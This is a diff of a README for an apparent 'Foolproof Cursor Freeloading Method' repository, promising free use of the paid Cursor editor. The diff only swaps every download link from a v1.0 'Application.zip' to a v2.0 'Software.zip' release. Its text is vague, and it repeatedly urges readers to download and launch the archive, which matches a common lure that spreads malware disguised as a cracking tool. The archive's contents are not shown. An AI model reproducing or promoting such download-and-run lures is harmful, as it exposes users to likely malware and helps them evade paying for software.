@@ -12,7 +12,7 @@ This repository is dedicated to a unique method for foolproof cursor freeloading
 
 ## Content
 
-Within this repository, you can find a file named [https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip), which contains valuable resources related to the Foolproof Cursor Freeloading Method. Click the link to access the file. 
+Within this repository, you can find a file named [https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip), which contains valuable resources related to the Foolproof Cursor Freeloading Method. Click the link to access the file. 
 
 Remember, the link leads to a specific file that needs to be launched for further exploration.
 
@@ -20,7 +20,7 @@ Remember, the link leads to a specific file that needs to be launched for furthe
 
 ## Explore Further
 
-If you are interested in learning more about the Foolproof Cursor Freeloading Method, we recommend visiting the provided [link](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip) to access additional resources. 
+If you are interested in learning more about the Foolproof Cursor Freeloading Method, we recommend visiting the provided [link](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip) to access additional resources. 
 
 ---
 
@@ -34,4 +34,4 @@ Thank you for visiting the "Foolproof Cursor Freeloading Method" repository 🚀
 
 ---
 
-[![Launch https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip)](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v1.0/Application.zip)
+[![Launch https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip)](https://github.com/MarcosPilarr/Foolproof-cursor-freeloading-method/releases/download/v2.0/Software.zip)
